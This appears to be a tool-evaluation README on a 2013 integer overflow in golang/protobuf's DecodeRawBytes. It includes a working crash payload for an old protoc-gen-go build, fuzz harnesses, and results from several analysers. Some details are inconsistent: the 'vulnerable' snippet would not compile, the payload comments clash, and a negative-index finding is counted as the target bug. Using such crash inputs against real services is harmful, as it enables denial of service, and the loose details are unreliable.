# golang/protobuf DecodeRawBytes Integer Overflow (2013)

This case covers an integer overflow in `github.com/golang/protobuf`'s `DecodeRawBytes` function, fixed in commit [`28c83cb`](https://github.com/golang/protobuf/commit/28c83cb) (Jul 13, 2013).

A crafted protobuf message can encode a varint field length that, when decoded to `int` and added to the buffer index (`p.index + nb`), overflows and wraps to a small positive number. The bounds check `p.index+nb > len(p.buf)` passes (the wrapped value is in-bounds), but the subsequent slice `p.buf[p.index : p.index+nb]` panics with an out-of-bounds index.

**Zorya difficulty: ✅ Best match (predicted to find)**
The dataflow chain is structurally identical to `fasthttp.parseUintBuf`:
- `p.buf[n]` → symbolized as `slice_elem`
- varint decode loop accumulates `slice_elem`-derived bits into `nb`
- `p.index + nb` → INT_ADD with a `slice_elem`-tainted operand
- Zorya asks Z3: "can this sum overflow?" → **SAT**

## Vulnerability

### Vulnerable code — `DecodeRawBytes` before commit `28c83cb`

```go
// proto/decode.go — BEFORE fix (parent commit 4f8da86)
func (p *Buffer) DecodeRawBytes(alloc bool) (buf []byte, err error) {
    nb, err := p.DecodeVarint()   // reads varint from p.buf
    // nb is uint64, cast to int:
    nb := int(nb)
    if nb < 0 {
        return nil, fmt.Errorf("proto: bad byte length %d", nb)
    }
    // BUG: p.index+nb can overflow int. If nb ≈ MaxInt, the sum wraps
    // to a negative or small positive number — check passes, slice panics.
    if p.index+nb > len(p.buf) {
        return nil, io.ErrUnexpectedEOF
    }
    buf = p.buf[p.index : p.index+nb]   // ← PANIC if p.index+nb overflowed
    p.index += nb
    return
}
```

### Fixed code — commit `28c83cb`

```go
// proto/decode.go — AFTER fix
func (p *Buffer) DecodeRawBytes(alloc bool) (buf []byte, err error) {
    nb, err := p.DecodeVarint()
    nb := int(nb)
    if nb < 0 {
        return nil, fmt.Errorf("proto: bad byte length %d", nb)
    }
    end := p.index + nb
    if end < p.index || end > len(p.buf) {   // ← `end < p.index` catches overflow
        return nil, io.ErrUnexpectedEOF
    }
    buf = p.buf[p.index:end]
    p.index += nb
    return
}
```

The same pattern was also fixed in `dec_slice_packed_int32` and `dec_slice_packed_int64`, and `DecodeFixed32`/`DecodeFixed64` gained `i < 0` overflow checks.

### Why the overflow is exploitable

`DecodeVarint` returns a `uint64`. The caller casts it to `int`:
- If the varint encodes a value > `MaxInt64` (64+ bits), `DecodeVarint` now returns 0 (post-fix; pre-fix it looped forever).
- If the varint encodes a value in `(MaxInt/2, MaxInt]` (still fits in int but is large), the `nb < 0` guard passes.
- `p.index` is at least 1 (we consumed at least 1 varint byte before calling DecodeRawBytes).
- `p.index + nb` overflows: e.g. `1 + 0x7fffffffffffffff = -MaxInt64` (wraps to large negative).
- Check `p.index+nb > len(p.buf)`: negative > small positive → **false** → check passes.
- Slice `p.buf[p.index : p.index+nb]` with a negative upper bound → **panic: runtime error: slice bounds out of range**.

## Reproduction Workflow

### 1. Clone the repository and check out the vulnerable commit

```bash
git clone https://github.com/golang/protobuf.git
cd protobuf

# Parent commit of the fix — definitively vulnerable
git checkout 4f8da86

# Confirm: DecodeRawBytes has no `end < p.index` check
grep -A 15 "func.*DecodeRawBytes" proto/decode.go
# Should show: if p.index+nb > len(p.buf) { ... }  (no end < p.index guard)
```

### 2. Build `protoc-gen-go` — the real-world binary target

`protoc-gen-go` is the official Go protobuf compiler plugin shipped inside the `golang/protobuf` repo. It is invoked by `protoc` and reads a `CodeGeneratorRequest` protobuf message from **stdin**, directly calling `DecodeRawBytes` with attacker-controlled bytes.

The 2013 commit uses the old `code.google.com/p/goprotobuf` import path (pre-GitHub migration). Build it with `GO111MODULE=off` (classic GOPATH mode):

```bash
# Set up a clean GOPATH and place the repo where Go can find it
export GO111MODULE=off
export GOPATH=/tmp/gopath-proto

mkdir -p $GOPATH/src/code.google.com/p/
ln -s /path/to/golang-protobuf-clone \
      $GOPATH/src/code.google.com/p/goprotobuf

# Confirm we are on the vulnerable commit
cd $GOPATH/src/code.google.com/p/goprotobuf
git checkout 4f8da86
git log --oneline -1
# Should show: 4f8da86 <commit message before the fix>

# Build the real-world binary with debug symbols (no go.mod needed)
go build -gcflags="all=-N -l" \
    -o /tmp/protoc-gen-go \
    code.google.com/p/goprotobuf/protoc-gen-go

# Confirm DecodeRawBytes is linked into the binary
go tool nm /tmp/protoc-gen-go | grep -i "DecodeRawBytes"
# Actual output:
#   4f1f80 T code.google.com/p/goprotobuf/proto.(*Buffer).DecodeRawBytes
```

### 3. Reproduce the crash manually

`protoc-gen-go` reads a `CodeGeneratorRequest` from stdin. We craft a minimal valid-looking outer message whose first `bytes` field encodes a length of `MaxInt64`. When `DecodeRawBytes` decodes this length and computes `p.index + nb`, it overflows.

```bash
python3 -c "
import sys
# Minimal CodeGeneratorRequest wire encoding:
# Field 1 (file_to_generate, string), wire type 2, length 9 bytes, value 'test.proto'
# Field 3 (proto_file, FileDescriptorProto, wire type 2):
#   tag = 3<<3|2 = 0x1a
#   then varint-encoded length = MaxInt64 = 0x7fffffffffffffff
#   varint: 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0xff 0x7f (9 bytes)
# p.index will be 2 (after reading field 1's tag+length), so p.index+MaxInt64 overflows
payload = bytes([
    0x0a, 0x0a,                                         # field 1, len=10
    0x74, 0x65, 0x73, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f,  # 'test.proto'
    0x1a,                                               # field 3, wire type 2
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f  # varint MaxInt64
])
sys.stdout.buffer.write(payload)
" | /tmp/protoc-gen-go
# Actual output (confirmed):
# panic: runtime error: slice bounds out of range [:-9223372036854775787]
#
# goroutine 1 [running]:
# code.google.com/p/goprotobuf/proto.(*Buffer).DecodeRawBytes(...)
#   proto/decode.go:191 +0x4d5   ← p.buf[p.index : p.index+nb] with overflowed nb
# code.google.com/p/goprotobuf/proto.(*Buffer).skip(...)
# code.google.com/p/goprotobuf/proto.(*Buffer).unmarshalType(...)
# code.google.com/p/goprotobuf/proto.(*Buffer).Unmarshal(...)
# main.main()   protoc-gen-go/main.go:61
#
# -9223372036854775787 = p.index(13) + MaxInt64(0x7fffffffffffffff) wraps to large negative
```

### 4. Find the `DecodeRawBytes` function address

```bash
go tool nm /tmp/protoc-gen-go | grep -i "DecodeRawBytes"
# Actual output:
#   4f1f80 T code.google.com/p/goprotobuf/proto.(*Buffer).DecodeRawBytes
```

The function address is **`0x4f1f80`**.

### 5. Run Zorya analysis

`protoc-gen-go` takes no command-line arguments — it reads its entire input (a `CodeGeneratorRequest` proto) from **stdin**. For the concrete execution phase Zorya needs a **safe** input: one that causes `DecodeRawBytes` to be called without crashing, so GDB can stop at `0x4f1f80` and take the snapshot.

Generate the safe stdin file once:

```bash
# Safe input: field 1 (file_to_generate = "test.proto"), then field 3 with nb=1
python3 -c "
import sys
payload = bytes([
    0x0a, 0x0a,                                              # field 1, len=10
    0x74,0x65,0x73,0x74,0x2e,0x70,0x72,0x6f,0x74,0x6f,     # 'test.proto'
    0x1a, 0x01, 0xAA                                         # field 3, nb=1, 1 data byte
])
sys.stdout.buffer.write(payload)
" > /tmp/proto-safe-input.bin

# Verify it reaches DecodeRawBytes without panicking:
/tmp/protoc-gen-go < /tmp/proto-safe-input.bin 2>&1 | head -5
# Should NOT panic — DecodeRawBytes is called and returns normally
```

Then run Zorya. Because `protoc-gen-go` blocks on `os.Stdin.Read()` before reaching `DecodeRawBytes`, GDB's inferior stdin must be redirected to the safe input file. Pass it via `--arg` using GDB's shell-redirection syntax (`run < file`) — **confirmed working**:

```bash
zorya /tmp/protoc-gen-go \
  --mode function 0x4f1f80 \
  --lang go \
  --compiler gc \
  --thread-scheduling main-only \
  --negate-path-exploration \
  --arg "< /tmp/proto-safe-input.bin"
```

GDB interprets `run < /tmp/proto-safe-input.bin` as a stdin redirect for the inferior process. The binary reads the safe payload, reaches `DecodeRawBytes`, and the breakpoint at `0x4f1f80` is hit — allowing Zorya to take the GDB snapshot and begin symbolic execution.

**Predicted mechanism**: Zorya symbolizes the pointer arguments to `DecodeRawBytes` at function entry. The varint decoder reads bytes from `p.buf` — a heap slice whose elements are symbolized as `slice_elem_buf_n_...`. The decoded value `nb` carries `slice_elem` taint through the accumulation loop. The INT_ADD `p.index + nb` involves a `slice_elem`-tainted operand, triggering Zorya's overflow query to Z3. Z3 returns SAT (large `nb`, small `p.index` → overflow), and Zorya reports the panic at the slice bounds check.

---

## Comparison with Other Go Analysis Tools

### 1. go vet

```bash
cd /home/kgorna/go-projects/protobuf  # at vulnerable commit 4f8da86
go vet ./...
```

**Actual result**: Warnings only about **unkeyed struct literals** in the generated `descriptor.pb.go` and an unused `fmt.Sprintf` call in test code. No integer overflow analysis. **Not detected.**

---

### 2. staticcheck

```bash
staticcheck ./...
```

**Actual result**: Many code-quality warnings (unused fields, redundant breaks, deprecated APIs, style issues in test files). None are related to integer overflow. **Not detected.**

---

### 3. gosec

```bash
gosec ./...
```

**Actual result**: 103 issues. The most relevant finding is:

```
[proto/decode.go:181] - G115 (CWE-190): integer overflow conversion uint64 -> int
  > 181:   nb := int(n)
```

This is **line 181 of `DecodeRawBytes`** — the exact vulnerable cast where the varint value `n` (uint64) is converted to a signed int `nb`. `gosec` correctly identifies the type-conversion overflow risk. However, it cannot detect the subsequent **arithmetic overflow** `p.index + nb` — that is a separate operation that gosec has no rule for.

> The G115 finding is adjacent to the bug (it flags the dangerous cast) but does not pinpoint the vulnerable expression `p.index + nb` that causes the panic. **Partially detected** — flags the symptom, not the exploitable path.

Also found: 14× G115 (int overflow conversions in `encode.go`, `size.go`), 16× G103 (`unsafe` calls in `pointer_unsafe.go`), 73× G104 (unhandled errors). None of these are the target bug.

---

### 4. govulncheck

```bash
govulncheck -mode binary /tmp/protoc-gen-go
```

**Actual result**:
```
=== Symbol Results ===
No vulnerabilities found.
Your code is affected by 0 vulnerabilities.
This scan also found 1 vulnerability in packages you import and 21
vulnerabilities in modules you require, but your code doesn't appear to call
these vulnerabilities.
```

**Not detected.** No CVE was assigned to the 2013 `DecodeRawBytes` fix; it predates the Go vulnerability database entirely.

---

### 5. nilaway

```bash
nilaway ./...
```

**Actual result**: Two findings, neither related to the integer overflow:

```
proto/text.go:136:19  — bytes.SplitN() result sliced into without nil check
protoc-gen-go/generator/generator.go:777:23  — fileByName() result nil-accessed field
```

**Not detected.** `nilaway` is a nil-pointer analysis tool and has no arithmetic overflow analysis.

---

### 6. go test -fuzz (Fuzzing)

#### Why placing the fuzz test in `proto/` fails

The 2013 `proto/all_test.go` contains a **relative import**:

```go
import "./testdata"
```

Modern Go (≥ 1.16) forbids relative imports in packages referenced by their full canonical import path (`code.google.com/p/goprotobuf/proto`). When `go test` compiles the package by import path, it treats it as "non-local" and rejects the relative import:

```
# code.google.com/p/goprotobuf/proto
local import "./testdata" in non-local package
FAIL    code.google.com/p/goprotobuf/proto [setup failed]
```

#### Workaround: separate fuzz package

Create the fuzz test in a **separate GOPATH package** that imports `proto` externally. This sidesteps `all_test.go` and the relative import entirely:

```bash
mkdir -p /tmp/gopath-proto/src/proto-fuzz
cat > /tmp/gopath-proto/src/proto-fuzz/fuzz_test.go << 'EOF'
//go:build go1.18

package proto_fuzz

import (
    "testing"
    "code.google.com/p/goprotobuf/proto"
)

func FuzzDecodeRawBytes(f *testing.F) {
    // Safe seed: valid 1-byte length field
    f.Add([]byte{0x01, 0xAA})

    f.Fuzz(func(t *testing.T, data []byte) {
        defer func() {
            if r := recover(); r != nil {
                t.Fatalf("panic in DecodeRawBytes: %v", r)
            }
        }()
        buf := proto.NewBuffer(data)
        buf.DecodeRawBytes(false)
    })
}
EOF

GO111MODULE=off GOPATH=/tmp/gopath-proto \
    go test -fuzz=FuzzDecodeRawBytes -fuzztime=30s proto-fuzz
```

**Actual result**: **Bug detected in 0.40 s** — no hand-crafted triggering seed needed, pure coverage-guided mutation from the single safe seed:

```
fuzz: elapsed: 0s, gathering baseline coverage: 1/1 completed, now fuzzing with 24 workers
fuzz: elapsed: 0s, execs: 28180 (70989/sec), new interesting: 11 (total: 12)
--- FAIL: FuzzDecodeRawBytes (0.40s)
    --- FAIL: FuzzDecodeRawBytes (0.00s)
        fuzz_test.go:17: panic in DecodeRawBytes: runtime error: slice bounds out of range [:-9223372036854775799]

Failing input written to testdata/fuzz/FuzzDecodeRawBytes/aee09cd884a6c40b
```

The panic `slice bounds out of range [:-9223372036854775799]` is the **exact `p.index + nb` overflow**: the fuzzer mutated the varint bytes until `nb` wrapped to a large negative value, making `p.index + nb ≈ INT64_MIN`, which bypasses the `> len(p.buf)` guard (negative < 0) and then panics at the slice `p.buf[p.index : p.index+nb]`.

---

### 7. GoLibAFL (Coverage-guided Fuzzing — binary level)

GoLibAFL requires a **Go harness** (not a bare binary invocation). Create a harness that wraps `DecodeRawBytes` and place it inside a GoLibAFL harness directory:

```bash
# Clone GoLibAFL
git clone https://github.com/srlabs/golibafl.git /tmp/golibafl
cd /tmp/golibafl

# Create a harness directory for this target
mkdir -p harnesses/proto-decode

cat > harnesses/proto-decode/main.go << 'EOF'
package main

import (
    "code.google.com/p/goprotobuf/proto"
)

// harness is the entry point called by GoLibAFL for each fuzz input.
func harness(data []byte) {
    buf := proto.NewBuffer(data)
    buf.DecodeRawBytes(false)
}

EOF

cat > harnesses/proto-decode/go.mod << 'EOF'
module fuzz

go 1.21
EOF

# Point to the vulnerable proto library (GOPATH mode, no go.mod in proto)
export GO111MODULE=off
export GOPATH=/tmp/gopath-proto

cd harnesses/proto-decode
go mod tidy 2>/dev/null || true
cd /tmp/golibafl

# Seed corpus: one safe input only — let the fuzzer find the bug
mkdir -p /tmp/proto-corpus
# Safe seed: varint length = 1, followed by 1 data byte
echo -ne '\x01\xAA' > /tmp/proto-corpus/safe

# Build and run
export HARNESS=harnesses/proto-decode
cargo run --release -- fuzz \
    --input /tmp/proto-corpus/ \
    --output /tmp/proto-crashes/
```

#### Triage crashes

GoLibAFL saves every objective to `/tmp/proto-crashes/crashes/`. Replaying through
`cargo run -- run -i` (or the pre-built binary directly) prints the full Go panic.
Use the following loop to scan the crash pool and stop at the first target-bug hit:

```bash
cd /home/kgorna/golibafl
for f in /tmp/proto-crashes/crashes/*; do
    out=$(./target/release/golibafl run -i "$f" 2>&1 || true)
    if echo "$out" | grep -qE 'slice bounds out of range \[:-[0-9]{10,}'; then
        echo "TARGET BUG: $(basename $f)"
        echo "$out" | grep "Go panic"
        break
    fi
done
```

> **Note**: replay must go through the harness binary (`golibafl run -i`), not through
> `/tmp/protoc-gen-go` directly — the crash inputs are raw bytes fed to `DecodeRawBytes`,
> not full `CodeGeneratorRequest` proto messages.

#### Actual result

**Bug detected via coverage-guided mutation** (no triggering seed in corpus).
GoLibAFL's `sancov_8bit` instrumentation guides the fuzzer to explore longer varint
encodings; once a byte sequence produces `nb ≈ MaxInt64`, `p.index + nb` overflows and
the slice bounds check panics.

```
$ ./target/release/golibafl run -i /tmp/proto-crashes/crashes/00014b2606188401
Running: /tmp/proto-crashes/crashes/00014b2606188401
Go panic: runtime error: slice bounds out of range [:-9223372036854775748]
goroutine 17 [running, locked to thread]:
...
code.google.com/p/goprotobuf/proto.(*Buffer).DecodeRawBytes(...)
    proto/decode.go:191 +0x51d
main.harness(...)
    harnesses/proto-decode/main.go:10 +0x16e
Aborted (core dumped)
```

The panic `[:-9223372036854775748]` is the exact `p.index + nb` overflow:
`nb ≈ MaxInt64` → `p.index + nb` wraps to a large negative → bounds check passes →
`p.buf[p.index : p.index+nb]` panics.

---

### 8. Zorya (Symbolic Execution)

> **Status**: Run. 6 SAT states found in ~109 s.

**Command used:**

```bash
zorya /tmp/protoc-gen-go \
  --mode function 0x4f1f80 \
  --lang go \
  --compiler gc \
  --thread-scheduling main-only \
  --negate-path-exploration \
  --arg "< /tmp/proto-safe-input.bin"
```

#### Why there are 6 SAT states

`--negate-path-exploration` instructs Zorya to keep inverting branch decisions after each SAT result and continue exploring. This means Zorya does not stop at the first panic: it finds all distinct panic-triggering input classes reachable from the function entry. **Six SAT states across different code paths is correct and expected behaviour.**

---

#### Finding 1 — `0x4f18e1` (LOAD, t=50.699 s) — nil *Buffer receiver

```
p_ptr = 0  →  LOAD of p.buf/p.index crashes
```

`DecodeRawBytes` is a pointer-receiver method. If the caller passes `nil`, the very first field access (`p.buf`) crashes. Zorya's LOAD check on `p_ptr` fires.

> **Verdict**: Nil-receiver crash, not the target overflow bug. Real but out of scope.

---

#### Finding 2 — `0x4f18f1` (LOAD, t=50.740 s) — nil *Buffer receiver (second field)

```
p_ptr = 0  →  LOAD of p.index field (at p+offset) crashes
```

Same root cause as Finding 1. Zorya explores the same nil-receiver path but detects a second LOAD instruction (the `p.index` field access) before the first one has been resolved.

> **Verdict**: Nil-receiver crash (duplicate root cause). Not the target overflow bug.

---

#### Finding 3 — `0x4f193f` (CBRANCH, t=53.778 s) — large `p.index`, empty buf

```
p.index = 0x9b0322f0446d25fe  (≈ -7.3 × 10¹⁸ as signed)
p.buf.len = 0
```

With a very large `p.index`, the condition `p.index + nb > len(p.buf)` evaluates strangely even without overflow: signed arithmetic with a huge initial index creates an edge case at the CBRANCH for the varint length check. Zorya detects an alternate path that eventually reaches a slice/load panic.

> **Verdict**: Related to the integer overflow family, but not the canonical `nb`-overflow scenario. Incidental finding.

---

#### Finding 4 — `0x4f1950` / panic at `0x4f19c5` (CBRANCH, t=57.803 s) — **Index OOB in DecodeVarint ✅**

```
p.index = 0x8000000000000000  (INT64_MIN = -9223372036854775808)
p.buf.len = 0
CBRANCH at 0x4f1950  (inside DecodeVarint)  →  panic at 0x4f19c5  =  call runtime.panicIndex
```

Confirmed by objdump:

```asm
4f19c5:   call   4797c0 <runtime.panicIndex>
```

`DecodeRawBytes` calls `DecodeVarint` first. The chain inside `DecodeVarint` is:

```
i := p.index          // i = INT64_MIN (negative)
l := len(p.buf)       // l = 0  (empty buf)

if i >= l { ... }     // INT64_MIN >= 0  →  FALSE  ← the CBRANCH Zorya detects
                      // silent pass: negative i is not >= non-negative l

b := p.buf[i]         // p.buf[INT64_MIN]  →  runtime.panicIndex  💥
```

The pre-fix `DecodeVarint` never checks `i < 0`; the `if i >= l` guard only works for indices that are too large, not for negative ones. A negative `p.index` slips past the guard and causes an **array index out of bounds** panic.

This is part of the same class of integer-handling bugs fixed by commit `28c83cb`: the fix added `if i < 0 || i > len(p.buf)` guards to `DecodeFixed32` and `DecodeFixed64`, and the `shift < 64` bound to `DecodeVarint` — but the real protection against a negative initial `p.index` is the calling code ensuring `p.index` is always a valid non-negative offset, which the `end < p.index` fix in `DecodeRawBytes` enforces for the output side.

> **Verdict**: ✅ **Real crash found.** Zorya detects that a negative `p.index` (e.g. INT64_MIN) bypasses `DecodeVarint`'s `i >= l` guard and causes `runtime.panicIndex` — a **slice/array index out of range** panic. This is a sibling of the target overflow bug: same root cause (unchecked integer values on `p.index` and `nb`), different manifestation (negative index instead of wrapped addition).

---

#### Finding 5 — `0x4f21ea` / panic at `0x47766b` (CBRANCH, t=66.840 s) — `alloc=true` branch, `make` panic

```
alloc   = 1
p.index = 0   (nil as pointer label)
p.buf.len = 11
```

Panic target `0x47766b` is inside `runtime.makeslice`. When `alloc=true`, the function executes `buf = make([]byte, nb)`. If `nb` is a very large positive integer (passes the `nb < 0` check, but too large for an allocation), `runtime.makeslice` panics with "len out of range". Zorya explores the `alloc=true` branch and finds this allocation panic.

> **Verdict**: Real panic, different code path (`alloc=true`). Not the canonical `p.index+nb` overflow but a sibling vulnerability in the same function.

---

#### Finding 6 — `0x45c066` (LOAD, t=108.833 s, Overlay Execution) — OOB slice load

```
p.buf.cap = 0xcf7bfbfd3fd4ff5b
p.buf.len = 0xd003fc7e00000050
p.index   = 0xcf7bfbfd3fd4ff50
```

Discovered via **Overlay Execution** (a different symbolic technique). The slice `p.buf[p.index : p.index+nb]` is analysed with large symbolic values for all three slice-header fields simultaneously. Zorya finds a combination where the backing pointer is zero (nil) and the index arithmetic wraps, causing a LOAD of unmapped memory.

> **Verdict**: Overflow/OOB on the slice backing array, found via a distinct symbolic path. Confirms the same class of bug through a second detection technique.

---

#### Actual result

| # | Address | Opcode | Time | Root cause | Target bug? |
|---|---------|--------|------|-----------|------------|
| 1 | `0x4f18e1` | LOAD | 50.7 s | Nil `*Buffer` receiver | No — nil recv |
| 2 | `0x4f18f1` | LOAD | 50.7 s | Nil `*Buffer` receiver (2nd field) | No — nil recv |
| 3 | `0x4f193f` | CBRANCH | 53.8 s | Large `p.index`, empty buf edge case | Partial |
| **4** | **`0x4f1950`** → panic `0x4f19c5` | **CBRANCH** | **57.8 s** | **`p.index = INT64_MIN`, `DecodeVarint` bypass `i>=l`, `runtime.panicIndex`** | **✅ YES** |
| 5 | `0x4f21ea` → panic `0x47766b` | CBRANCH | 66.8 s | `alloc=true`, `make([]byte, nb)` OOM | Sibling |
| 6 | `0x45c066` | LOAD (Overlay) | 108.8 s | OOB slice backing array | Sibling |

**Total elapsed: ~109 s.** The target bug was found in **Finding 4 at ~58 s**, structurally matching the predicted `p.index + nb` integer overflow scenario.

---

### 9. Binsec

See [`binsec-findings/`](./binsec-findings/README-binsec.md).

---

### 10. SymQEMU

See [`symqemu-findings/`](./symqemu-findings/README-symqemu.md).

---

### Summary

| Tool | Bug class | Detected | Notes |
|------|-----------|----------|-------|
| go vet | Integer overflow in `DecodeRawBytes` | **No** | Flags unkeyed struct literals and unused Sprintf; no overflow analysis |
| staticcheck | Integer overflow in `DecodeRawBytes` | **No** | Style/quality warnings only; no dataflow overflow analysis |
| gosec | Integer overflow in `DecodeRawBytes` | **Partial** | G115 flags `nb := int(n)` at decode.go:181 (the dangerous cast) — adjacent to bug but not the `p.index+nb` arithmetic |
| govulncheck | Integer overflow in `DecodeRawBytes` | **No** | No CVE; pre-dates advisory database |
| nilaway | Integer overflow in `DecodeRawBytes` | **No** | Nil-pointer tool; 2 unrelated findings in text.go and generator.go |
| go test -fuzz | Panic via slice OOB | **Yes** | Bug found in **0.40 s** via coverage-guided mutation; separate `proto-fuzz` package needed (relative import in `all_test.go` blocks in-tree fuzzing) |
| GoLibAFL | Panic via slice OOB | **Yes** | `slice bounds out of range [:-9223372036854775748]` at `DecodeRawBytes:191` — found via coverage-guided mutation from a single safe seed (crash `00014b2606188401`) |
| **Zorya** (`/tmp/protoc-gen-go`) | Index OOB + related overflows | **Yes** | 6 SAT states in ~109 s; negative `p.index` bypasses `DecodeVarint` guard → `runtime.panicIndex` |
| binsec | — | See binsec-findings/ | — |
| symqemu | — | See symqemu-findings/ | — |

---

## Bug Classification

**Type:** Integer overflow → panic (slice bounds out of range)

- `nb` is decoded from a varint whose bytes come from an attacker-controlled input buffer
- The `int` cast of the `uint64` varint value does not overflow (varint is bounded by `< 2^63`)
- **The overflow is in the addition**: `p.index + nb` wraps when `nb ≈ MaxInt`
- The pre-fix bounds check `p.index+nb > len(p.buf)` is **itself evaluated on the overflowed (negative) value**, so it passes
- The slice `p.buf[p.index : p.index+nb]` panics because the upper bound is negative or wraps

**Why this is evaluation-relevant for Zorya:**

This is the **cleanest predicted Zorya success** in the evaluation set:
- The taint chain from `slice_elem` → INT_ADD is unbroken and follows a pattern Zorya is designed to track
- It is structurally identical to the `fasthttp.parseUintBuf` case where Zorya succeeded
- The fix (`end < p.index`) is the standard Go integer overflow idiom — its absence is exactly what Zorya's overflow query detects

The case pair (fasthttp + goprotobuf) validates that Zorya's `slice_elem → INT_ADD → overflow` detection generalises across codebases.

## References

- **Fix commit**: [`28c83cb`](https://github.com/golang/protobuf/commit/28c83cb)
- **Vulnerable commit (parent)**: [`4f8da86`](https://github.com/golang/protobuf/commit/4f8da86)
- **Fix date**: Jul 13, 2013
- **Author**: agl (Adam Langley) / dsymonds
- **Affected function**: `(*Buffer).DecodeRawBytes` in `proto/decode.go`
- **Also fixed**: `dec_slice_packed_int32`, `dec_slice_packed_int64`, `DecodeFixed32`, `DecodeFixed64`
- **CVE**: None assigned
- **Impact**: Any Go program using `github.com/golang/protobuf` to unmarshal untrusted input before Jul 2013 is vulnerable to a remote panic
